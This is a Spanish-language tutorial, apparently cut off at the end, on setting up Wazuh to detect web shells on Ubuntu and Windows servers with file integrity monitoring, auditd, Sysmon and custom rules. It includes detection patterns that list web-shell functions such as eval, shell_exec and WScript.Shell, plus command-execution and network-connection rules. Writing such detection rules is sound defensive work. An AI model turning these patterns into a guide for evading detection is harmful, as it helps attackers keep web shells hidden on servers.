+<p>El módulo FIM de Wazuih puede detectar, casi en tiempo real, cambios en los archivos accesibles via web y de esta forma alertar a los administradores.</p>
+<p>Usaremos este módulo para detectar cuando se han creado o odificado archivos en <code>/var/wwww/html</code>y en <code>C:\inetpub\wwwroot</code>, directorios raiz por defecto en Ubuntu y Windows respectivamente.</p>
+<p>Además, FIM escanea los contenidos de los archivos para monitorizar la aparción de firmas de web shells cuando los archivos se modifican.</p>
+<h4 id="configuracion-de-ubuntu">Configuración de Ubuntu</h4>
+<ol>
+<li>
+<p>Añadir la siguiente configuración al agente de Wazuh en el archivo <code>/var/ossec/etc/ossec.conf</code>, dentro del bloque <code>&lt;syscheck&gt;</code>:</p>
+<p><div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">directories</span> <span class="na">realtime</span><span class="o">=</span><span class="s">&quot;yes&quot;</span> <span class="na">check_all</span><span class="o">=</span><span class="s">&quot;yes&quot;</span> <span class="na">report_changes</span><span class="o">=</span><span class="s">&quot;yes&quot;</span><span class="p">&gt;</span>/var/www/html<span class="p">&lt;/</span><span class="nt">directories</span><span class="p">&gt;</span>
+</code></pre></div>
+Esto detecta los cambios en el directorio <code>/var/www/html</code>.</p>
+</li>
+<li>
+<p>Reiniciar el agente de Wazuh para aplicar los cambios en la configuración:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>systemctl<span class="w"> </span>restart<span class="w"> </span>wazuh-agent
+</code></pre></div>
+</li>
+</ol>
+<h4 id="configuracion-de-windows">Configuración de Windows</h4>
+<ol>
+<li>
+<p>Añadir la siguiente configuración al agente de Wazu en el archivo <code>C:\Program Files (x86)\ossec-agent\ossec.conf</code>, dentro del bloque <code>&lt;syscheck&gt;</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">directories</span> <span class="na">realtime</span><span class="o">=</span><span class="s">&quot;yes&quot;</span> <span class="na">check_all</span><span class="o">=</span><span class="s">&quot;yes&quot;</span> <span class="na">report_changes</span><span class="o">=</span><span class="s">&quot;yes&quot;</span><span class="p">&gt;</span>C:\inetpub\wwwroot<span class="p">&lt;/</span><span class="nt">directories</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Corriendo una terminal de Powershell como administrador, reinicia el agente de Wazuh para aplicar los cambios en la configuración:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&gt;</span> <span class="nb">Restart-Service</span> <span class="n">-Name</span> <span class="n">wazuh</span>
+</code></pre></div>
+</li>
+</ol>
+<h4 id="configuracion-del-servidor-de-wazuh">Configuración del servidor de Wazuh</h4>
+<ol>
+<li>
+<p>Crear un archivo de reglas personalizado <code>reglas_webshell.xml</code> en el directorio <code>/var/ossec/etc/rules/</code> y colocar en él las siguientes reglas:</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">reglas_Webshell.xml</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="nt">&lt;group</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;linux, webshell, windows,&quot;</span><span class="nt">&gt;</span>
+<span class="cm">&lt;!-- Esta regla detecta la creación de archivos --&gt;</span>
+<span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;100500&quot;</span><span class="w"> </span><span class="na">level=</span><span class="s">&quot;12&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;if_sid&gt;</span>554<span class="nt">&lt;/if_sid&gt;</span>
+<span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;file&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;pcre2&quot;</span><span class="nt">&gt;</span>(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$<span class="nt">&lt;/field&gt;</span>
+<span class="nt">&lt;description&gt;</span>[File<span class="w"> </span>creation]:<span class="w"> </span>Possible<span class="w"> </span>web<span class="w"> </span>shell<span class="w"> </span>scripting<span class="w"> </span>file<span class="w"> </span>($(file))<span class="w"> </span>created<span class="nt">&lt;/description&gt;</span>
+<span class="nt">&lt;mitre&gt;</span>
+<span class="nt">&lt;id&gt;</span>T1105<span class="nt">&lt;/id&gt;</span>
+<span class="nt">&lt;id&gt;</span>T1505<span class="nt">&lt;/id&gt;</span>
+<span class="nt">&lt;/mitre&gt;</span>
+<span class="nt">&lt;/rule&gt;</span>
+
+<span class="cm">&lt;!-- Esta regla detecta la modificación de archivos --&gt;</span>
+<span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;100501&quot;</span><span class="w"> </span><span class="na">level=</span><span class="s">&quot;12&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;if_sid&gt;</span>550<span class="nt">&lt;/if_sid&gt;</span>
+<span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;file&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;pcre2&quot;</span><span class="nt">&gt;</span>(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$<span class="nt">&lt;/field&gt;</span><span class="w">    </span>
+<span class="nt">&lt;description&gt;</span>[File<span class="w"> </span>modification]:<span class="w"> </span>Possible<span class="w"> </span>web<span class="w"> </span>shell<span class="w"> </span>content<span class="w"> </span>added<span class="w"> </span>in<span class="w"> </span>$(file)<span class="nt">&lt;/description&gt;</span>
+<span class="nt">&lt;mitre&gt;</span>
+<span class="nt">&lt;id&gt;</span>T1105<span class="nt">&lt;/id&gt;</span>
+<span class="nt">&lt;id&gt;</span>T1505<span class="nt">&lt;/id&gt;</span>
+<span class="nt">&lt;/mitre&gt;</span>
+<span class="nt">&lt;/rule&gt;</span>
+
+<span class="cm">&lt;!-- Esta regla detecta la modificación de archivos con firmas asociadas a web shells de PHP --&gt;</span>
+<span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;100502&quot;</span><span class="w"> </span><span class="na">level=</span><span class="s">&quot;15&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;if_sid&gt;</span>100501<span class="nt">&lt;/if_sid&gt;</span>
+<span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;changed_content&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;pcre2&quot;</span><span class="nt">&gt;</span>(?i)passthru|exec|eval|shell_exec|assert|str_rot13|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|show_source|proc_open|pcntl_exec|execute|WScript.Shell|WScript.Network|FileSystemObject|Adodb.stream<span class="nt">&lt;/field&gt;</span>
+<span class="nt">&lt;description&gt;</span>[File<span class="w"> </span>Modification]:<span class="w"> </span>File<span class="w"> </span>$(file)<span class="w"> </span>contains<span class="w"> </span>a<span class="w"> </span>web<span class="w"> </span>shell<span class="nt">&lt;/description&gt;</span>
+<span class="nt">&lt;mitre&gt;</span>
+<span class="nt">&lt;id&gt;</span>T1105<span class="nt">&lt;/id&gt;</span>
+<span class="nt">&lt;id&gt;</span>T1505.003<span class="nt">&lt;/id&gt;</span>
+<span class="nt">&lt;/mitre&gt;</span>
+<span class="nt">&lt;/rule&gt;</span>
+<span class="nt">&lt;/group&gt;</span>
+</code></pre></div></td></tr></table></div>
+</li>
+<li>
+<p>Reiniciar Wazuh manager para aplicar la configuración de los cambios</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>systemctl<span class="w"> </span>restart<span class="w"> </span>wazuh-manager
+</code></pre></div>
+</li>
+</ol>
+<h5 id="explicacion-de-las-reglas-personalizadas">Explicación de las reglas personalizadas</h5>
+<ul>
+<li>
+<p><code>id="100500"</code>: ID único de esta regla.</p>
+</li>
+<li>
+<p><code>level="12"</code>: Severidad alta. El máximo es 15.</p>
+</li>
+<li>
+<p><code>&lt;if_sid&gt;554&lt;/if_sid&gt;</code>: Solo se aplica si antes se ha activado la regla con ID 554 (esta regla base detecta creación de archivos).</p>
+</li>
+<li>
+<p><code>&lt;field name="file" type="pcre2"&gt;...</code>: Aplica un regex (compatible con PCRE2) sobre el campo file. Busca archivos con extensiones típicas de web shells:</p>
+<p><code>.php, .asp, .jsp, .cshtml, .vbhtml, etc.</code></p>
+</li>
+<li>
+<p><code>$(file)</code>: Variable que se sustituye con el nombre del archivo real.</p>
+</li>
+<li>
+<p><code>&lt;mitre&gt;</code>: Indica técnicas MITRE ATT&amp;CK asociadas:</p>
+<ul>
+<li><em>T1105 – Ingress Tool Transfer: transferencia de herramientas maliciosas al sistema.</em></li>
+<li><em>T1505 – Server Software Component: modificación maliciosa de componentes del servidor (como web shells).</em></li>
+</ul>
+</li>
+</ul>
+<p>📌 Esta regla detecta que se ha creado un archivo sospechoso que podría ser un web shell.</p>
+<p>La segunda regla es similar, sólo que intenta detectar la <strong>modificación</strong> y no la creación de archivos.</p>
+<p>La tercera regla intenta detectar modificaciones de archivo, es decir que se haya disparado la segunda regla, y que éstas además incluyan funciontes típicas de webshells.</p>
+<h3 id="usando-reglas-personalizadas-para-detectar-indicios-de-web-shells">Usando reglas personalizadas para detectar indicios de web shells</h3>
+<p>Wazuh permite escribir reglas personalizadas que disparan alertas cuando se detectan determinadas características en logs. Además integraremos Wazuh con <strong>auditd</strong> en endpoints Linux y <strong>Sysmon</strong> en Windows para enriquecer los fuentes de logs, para así mejorar la seguridad.</p>
+<h4 id="ubuntu">Ubuntu</h4>
+<p><strong>Auditd</strong> (de Linux Audit Daemon) es una utilidad que recopila y almacena eventos del sistema tales como llamadas al sistema (<em>syscall</em>) y funciones. Usando auditd podemos monitorizar comandos del sistema así como conexiones de red que lleve a cabo un usuario de servidor web, escribiendo reglas que generen una alerta cuando esto ocurra.</p>
+<p>Así las cosas:</p>
+<ol>
+<li>
+<p>Actualizar los paquetes de los respositorios e instalar <strong>auditd</strong>:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>apt<span class="w"> </span>update
+<span class="gp">$ </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>auditd
+</code></pre></div>
+</li>
+<li>
+<p>Enviar los logs de <em>auditd</em> al servidor de Wazuh para su análisis, añadiendo para ello la siguiente configuración al agente de Wazuh en el archivo <code>/var/ossec/etc/ossec.conf</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;ossec_config&gt;</span>
+<span class="nt">&lt;localfile&gt;</span>
+<span class="w">    </span><span class="nt">&lt;location&gt;</span>/var/log/audit/audit.log<span class="nt">&lt;/location&gt;</span>
+<span class="w">    </span><span class="nt">&lt;log_format&gt;</span>audit<span class="nt">&lt;/log_format&gt;</span>
+<span class="nt">&lt;/localfile&gt;</span>
+<span class="nt">&lt;/ossec_config&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Obtener el identificador dle usuario del servidor web Apache ejecutando el siguiente comando:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>apachectl<span class="w"> </span>-S
+</code></pre></div>
+<details class="note">
+<summary>Salida</summary>
+<div class="highlight"><pre><span></span><code>VirtualHost<span class="w"> </span>configuration:
+*:80<span class="w">                   </span><span class="m">127</span>.0.1.1<span class="w"> </span><span class="o">(</span>/etc/apache2/sites-enabled/000-default.conf:1<span class="o">)</span>
+ServerRoot:<span class="w"> </span><span class="s2">&quot;/etc/apache2&quot;</span>
+Main<span class="w"> </span>DocumentRoot:<span class="w"> </span><span class="s2">&quot;/var/www/html&quot;</span>
+Main<span class="w"> </span>ErrorLog:<span class="w"> </span><span class="s2">&quot;/var/log/apache2/error.log&quot;</span>
+Mutex<span class="w"> </span>mpm-accept:<span class="w"> </span>using_defaults
+Mutex<span class="w"> </span>watchdog-callback:<span class="w"> </span>using_defaults
+Mutex<span class="w"> </span>default:<span class="w"> </span><span class="nv">dir</span><span class="o">=</span><span class="s2">&quot;/var/run/apache2/&quot;</span><span class="w"> </span><span class="nv">mechanism</span><span class="o">=</span>default<span class="w"> </span>
+PidFile:<span class="w"> </span><span class="s2">&quot;/var/run/apache2/apache2.pid&quot;</span>
+Define:<span class="w"> </span>DUMP_VHOSTS
+Define:<span class="w"> </span>DUMP_RUN_CFG
+<span class="hll">User:<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;www-data&quot;</span><span class="w"> </span><span class="nv">id</span><span class="o">=</span><span class="m">33</span>
+</span>Group:<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;www-data&quot;</span><span class="w"> </span><span class="nv">id</span><span class="o">=</span><span class="m">33</span>
+</code></pre></div>
+</details>
+</li>
+<li>
+<p>Añadir al archivo de configuración de <em>auditd</em> <code>/etc/audit/rules.d/audit.rules</code>, usando el id de usuario en el paso 3, lo siguiente:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">## Auditd rules that detect command execution from user www-data.</span>
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b32<span class="w"> </span>-S<span class="w"> </span>execve<span class="w"> </span>-F<span class="w"> </span><span class="nv">uid</span><span class="o">=</span>&lt;USER_ID&gt;<span class="w"> </span>-F<span class="w"> </span><span class="nv">key</span><span class="o">=</span>webshell_command_exec
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>execve<span class="w"> </span>-F<span class="w"> </span><span class="nv">uid</span><span class="o">=</span>&lt;USER_ID&gt;<span class="w"> </span>-F<span class="w"> </span><span class="nv">key</span><span class="o">=</span>webshell_command_exec
+
+<span class="c1">## Auditd rules that detect network connections from user www-data.</span>
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>socket<span class="w"> </span>-F<span class="w"> </span><span class="nv">a0</span><span class="o">=</span><span class="m">10</span><span class="w"> </span>-F<span class="w"> </span><span class="nv">euid</span><span class="o">=</span>&lt;USER_ID&gt;<span class="w"> </span>-k<span class="w"> </span>webshell_net_connect
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>socket<span class="w"> </span>-F<span class="w"> </span><span class="nv">a0</span><span class="o">=</span><span class="m">2</span><span class="w"> </span>-F<span class="w"> </span><span class="nv">euid</span><span class="o">=</span>&lt;USER_ID&gt;<span class="w"> </span>-k<span class="w"> </span>webshell_net_connect
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b32<span class="w"> </span>-S<span class="w"> </span>socket<span class="w"> </span>-F<span class="w"> </span><span class="nv">a0</span><span class="o">=</span><span class="m">10</span><span class="w"> </span>-F<span class="w"> </span><span class="nv">euid</span><span class="o">=</span>&lt;USER_ID&gt;<span class="w"> </span>-k<span class="w"> </span>webshell_net_connect
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b32<span class="w"> </span>-S<span class="w"> </span>socket<span class="w"> </span>-F<span class="w"> </span><span class="nv">a0</span><span class="o">=</span><span class="m">2</span><span class="w"> </span>-F<span class="w"> </span><span class="nv">euid</span><span class="o">=</span>&lt;USER_ID&gt;<span class="w"> </span>-k<span class="w"> </span>webshell_net_connect
+</code></pre></div>
+</li>
+<li>
+<p>Reiniciar <em>auditd</em> y el agente de Wazuh para aplicar los cambios en la configuración:</p>
+</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>systemctl<span class="w"> </span>restart<span class="w"> </span>auditd
+<span class="gp">$ </span>sudo<span class="w"> </span>systemctl<span class="w"> </span>restart<span class="w"> </span>wazuh-agent
+</code></pre></div>
+<h4 id="windows">Windows</h4>
+<p>System Monitor (Sysmon) es un servicio de sistema de Windows que monitoriza y registra la actividad del sistema en los logs de eventos de Windows.</p>
+<p>Complementa los logs con información detallada sobre la creación de procesos o conexiones de red, entre otros. Por ejemplo, Sysmon puede monitorizar el proceso <code>w3wp.exe,</code>componente fundamental del servidor web de Microsoft Internet Information Services (IIS). Este proceso se encarga de manejar las solicitudes HTTP recibidas por el servidor web y de procesarlas para generar las respuestas correspondientes.</p>
+<p>IIS tiene una funcionalidad de seguridad llamada <em>application pool</em> que permite que un pool de aplicaciones se ejecuten únicamente con una única cuenta, cuyo nombre por defecto es <code>DefaultAppTool</code>. </p>
+<p>Con esta cuenta, el proceso de IIS corre exclusivamente con privilegios de usuario. Los atacantes suelen aprovechar este proceso para abrir terminales de <strong>PowerShell</strong> o <strong>cmd</strong>. </p>
+<p>Explicado lo anterior, para configurar Sysmon y que Wazuh procese sus logs, haremos:</p>
+<ol>
+<li>
+<p>Descargar en nuestra máquina Windows el instalador de <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> y el <a href="https://wazuh.com/resources/blog/emulation-of-attack-techniques-and-detection-with-wazuh/sysmonconfig.xml">archivo de configuración que necesitamos</a></p>
+</li>
+<li>
+<p>Instalar Sysmon, usando la configuración descargada, mediante un terminal de PowerShell corriendo con privilegios de administrador:</p>
+</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="go">&gt; .\Sysmon64.exe -accepteula -i sysmonconfig.xml</span>
+</code></pre></div>
+<ol>
+<li>Añadir las siguientes líneas de configuración al archivo <code>C:\Program Files (x86)\ossec-agent\ossec.conf</code>, encargado de la captura y redireción de logs de Sysmon hacia el servidor de Wazuh:</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;ossec_config&gt;</span>
+<span class="w">  </span><span class="nt">&lt;localfile&gt;</span>
+<span class="w">    </span><span class="nt">&lt;location&gt;</span>Microsoft-Windows-Sysmon/Operational<span class="nt">&lt;/location&gt;</span>
+<span class="w">    </span><span class="nt">&lt;log_format&gt;</span>eventchannel<span class="nt">&lt;/log_format&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/localfile&gt;</span>
+<span class="nt">&lt;/ossec_config&gt;</span>
+</code></pre></div>
+<ol>
+<li>
+<p>Reiniciar el agente de Wazuh para aplicar los cambios en la configuración:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&gt;</span> <span class="nb">Restart-Service</span> <span class="n">-Name</span> <span class="n">wazuh</span>
+</code></pre></div>
+</li>
+</ol>
+<h4 id="amazon-linux-2-wazuh-server">Amazon Linux 2 (Wazuh server)</h4>
+<ol>
+<li>
+<p>Añadir al archivo de configuración <code>/var/ossec/etc/rules/reglas_webshell.xml</code>, las siguientes reglas que intenta detectar comandos ejecutados por una web shell, así como conexiones de red establecidas:</p>
+<details class="note">
+<summary>reglas_webshell.xml</summary>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Reglas Linux. --&gt;</span>
+<span class="nt">&lt;group</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;auditd, linux, webshell,&quot;</span><span class="nt">&gt;</span>
+<span class="cm">&lt;!-- Eta regla detecta comandos ejecutados por una web shell --&gt;</span>
+<span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;100520&quot;</span><span class="w"> </span><span class="na">level=</span><span class="s">&quot;12&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;if_sid&gt;</span>80700<span class="nt">&lt;/if_sid&gt;</span>
+<span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;audit.key&quot;</span><span class="nt">&gt;</span>webshell_command_exec<span class="nt">&lt;/field&gt;</span>
+<span class="w">    </span><span class="nt">&lt;description&gt;</span>[Command<span class="w"> </span>execution<span class="w"> </span>($(audit.exe))]:<span class="w"> </span>Possible<span class="w"> </span>web<span class="w"> </span>shell<span class="w"> </span>attack<span class="w"> </span>detected<span class="nt">&lt;/description&gt;</span>
+<span class="w">    </span><span class="nt">&lt;mitre&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>T1505.003<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>T1059.004<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/mitre&gt;</span>
+<span class="nt">&lt;/rule&gt;</span>
+<span class="cm">&lt;!-- Esta regla detecta conexiones de red realizadas por una web shell --&gt;</span>
+<span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;100521&quot;</span><span class="w"> </span><span class="na">level=</span><span class="s">&quot;12&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;if_sid&gt;</span>80700<span class="nt">&lt;/if_sid&gt;</span>
+<span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;audit.key&quot;</span><span class="nt">&gt;</span>webshell_net_connect<span class="nt">&lt;/field&gt;</span>
+<span class="w">    </span><span class="nt">&lt;description&gt;</span>[Network<span class="w"> </span>connection<span class="w"> </span>via<span class="w"> </span>$(audit.exe)]:<span class="w"> </span>Possible<span class="w"> </span>web<span class="w"> </span>shell<span class="w"> </span>attack<span class="w"> </span>detected<span class="nt">&lt;/description&gt;</span>
+<span class="w">    </span><span class="nt">&lt;mitre&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>TA0011<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>T1049<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>T1505.003<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/mitre&gt;</span>
+<span class="nt">&lt;/rule&gt;</span>
+<span class="nt">&lt;/group&gt;</span>
+
+<span class="cm">&lt;!-- Reglas Windows --&gt;</span>
+<span class="nt">&lt;group</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;sysmon, webshell, windows,&quot;</span><span class="nt">&gt;</span>
+<span class="cm">&lt;!-- Esta regla detecta comandos ejecutados por una web shell  --&gt;</span>
+<span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;100530&quot;</span><span class="w"> </span><span class="na">level=</span><span class="s">&quot;12&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;if_sid&gt;</span>61603<span class="nt">&lt;/if_sid&gt;</span>
+<span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;win.eventdata.parentImage&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;pcre2&quot;</span><span class="nt">&gt;</span>(?i)w3wp\.exe<span class="nt">&lt;/field&gt;</span>
+<span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;win.eventdata.parentUser&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;pcre2&quot;</span><span class="nt">&gt;</span>(?i)IIS\sAPPPOOL\\\\DefaultAppPool<span class="nt">&lt;/field&gt;</span>
+<span class="w">    </span><span class="nt">&lt;description&gt;</span>[Command<span class="w"> </span>execution<span class="w"> </span>($(win.eventdata.commandLine))]:<span class="w"> </span>Possible<span class="w"> </span>web<span class="w"> </span>shell<span class="w"> </span>attack<span class="w"> </span>detected<span class="nt">&lt;/description&gt;</span>
+<span class="w">    </span><span class="nt">&lt;mitre&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>T1505.003<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>T1059.004<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/mitre&gt;</span>
+<span class="nt">&lt;/rule&gt;</span>
+
+<span class="cm">&lt;!-- Esta regla detecta conexiones de red realizadas por una web shell --&gt;</span>
+<span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;100531&quot;</span><span class="w"> </span><span class="na">level=</span><span class="s">&quot;12&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;if_sid&gt;</span>61605<span class="nt">&lt;/if_sid&gt;</span>
+<span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;win.eventdata.image&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;pcre2&quot;</span><span class="nt">&gt;</span>(?i)w3wp\.exe<span class="nt">&lt;/field&gt;</span>
+<span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;win.eventdata.user&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;pcre2&quot;</span><span class="nt">&gt;</span>(?i)IIS\sAPPPOOL\\\\DefaultAppPool<span class="nt">&lt;/field&gt;</span>
+<span class="w">    </span><span class="nt">&lt;description&gt;</span>[Network<span class="w"> </span>connection]:<span class="w"> </span>Possible<span class="w"> </span>web<span class="w"> </span>shell<span class="w"> </span>attempting<span class="w"> </span>network<span class="w"> </span>connection<span class="w"> </span>on<span class="w"> </span>source<span class="w"> </span>port:<span class="w"> </span>$(win.eventdata.sourcePort)<span class="w"> </span>and<span class="w"> </span>destination<span class="w"> </span>port:<span class="w"> </span>$(win.eventdata.destinationPort)<span class="nt">&lt;/description&gt;</span>
+<span class="w">    </span><span class="nt">&lt;mitre&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>TA0011<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>T1049<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;id&gt;</span>T1505.003<span class="nt">&lt;/id&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/mitre&gt;</span>
+<span class="nt">&lt;/rule&gt;</span>
+<span class="nt">&lt;/group&gt;</span>
+</code></pre></div>
+</details>
+</li>
+<li>
+<p>Reiniciar el manager de Wazuh para aplicar los cambios en la configuración:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>systemctl<span class="w"> </span>restart<span class="w"> </span>wazuh-manager
+</code></pre></div>
+</li>
+</ol>
+<h3 id="usando-monitorizacion-de-comandos-para-detectar-las-conexiones-de-red-de-un-posible-ataque">Usando monitorización de comandos para detectar las conexiones de red de un posible ataque</h3>
+<p>En esta sección usaremos la monitorización de comandos para complementar el uso de <em>auditd</em> en el endpoint Linux. Nos servirá para obtener información adicional sobre las direcciones IP/puertos desde los que se originan los ataques.</p>
+<h4 id="ubuntu_1">Ubuntu</h4>
+<ol>
+<li>
+<p>Añadir las siguientes configuraciones al archivo de configuración del agente Wazuh <code>/var/ossec/etc/ossec.conf</code>. Esto determina el comando que se ejecutará en el endpoint:</p>
+<p><div class="highlight"><pre><span></span><code><span class="nt">&lt;ossec_config&gt;</span>
+<span class="nt">&lt;localfile&gt;</span>
+<span class="w">    </span><span class="nt">&lt;log_format&gt;</span>full_command<span class="nt">&lt;/log_format&gt;</span>
+<span class="w">    </span><span class="nt">&lt;command&gt;</span>ss<span class="w"> </span>-nputw<span class="w"> </span>|<span class="w"> </span>egrep<span class="w"> </span>&#39;&quot;sh&quot;|&quot;bash&quot;|&quot;csh&quot;|&quot;ksh&quot;|&quot;zsh&quot;&#39;<span class="w"> </span>|<span class="w"> </span>awk<span class="w"> </span>&#39;{<span class="w"> </span>print<span class="w"> </span>$5<span class="w"> </span>&quot;|&quot;<span class="w"> </span>$6<span class="w"> </span>}&#39;<span class="nt">&lt;/command&gt;</span>
+<span class="w">    </span><span class="nt">&lt;alias&gt;</span>webshell<span class="w"> </span>connections<span class="nt">&lt;/alias&gt;</span>
+<span class="w">    </span><span class="nt">&lt;frequency&gt;</span>120<span class="nt">&lt;/frequency&gt;</span>
+<span class="nt">&lt;/localfile&gt;</span>
+<span class="nt">&lt;/ossec_config&gt;</span>
+</code></pre></div>
+Como vemos, este comando se ejecuta cada 120 segundos con el fin de detectar conexiones activas abiertas por shells como <code>bash</code>, <code>zsh</code>, etc.</p>
+</li>
+<li>
+<p>Reiniciar el agente de Wazuh par aplicar los cambios de configuración:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>systemctl<span class="w"> </span>restart<span class="w"> </span>wazuh-agent
+</code></pre></div>
+</li>
+</ol>
+<h4 id="amazon-linux-2-wazuh-server_1">Amazon Linux 2 (Wazuh server)</h4>
+<ol>
+<li>
